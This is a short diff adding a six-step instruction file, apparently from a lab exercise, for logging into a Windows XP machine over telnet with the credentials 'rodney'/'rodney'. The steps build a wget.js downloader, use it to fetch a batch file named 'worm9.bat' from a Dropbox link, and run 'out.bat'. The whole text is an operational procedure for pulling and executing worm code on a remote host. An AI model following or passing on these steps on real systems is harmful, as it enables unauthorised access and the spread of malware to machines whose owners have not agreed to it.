@@ -1,0 +1,6 @@
+telnet into win xp using login(i.e username) rodney and password rodney
+create text file using command copy con wget.js
+copy and paste the text from the attached wget.js file
+press ctrl+z and then enter to save the file
+Then enter the command: cscript /nologo wget.js https://www.dropbox.com/s/vgi26o1tgpp633d/worm9.bat?dl=1
+Then enter out.bat
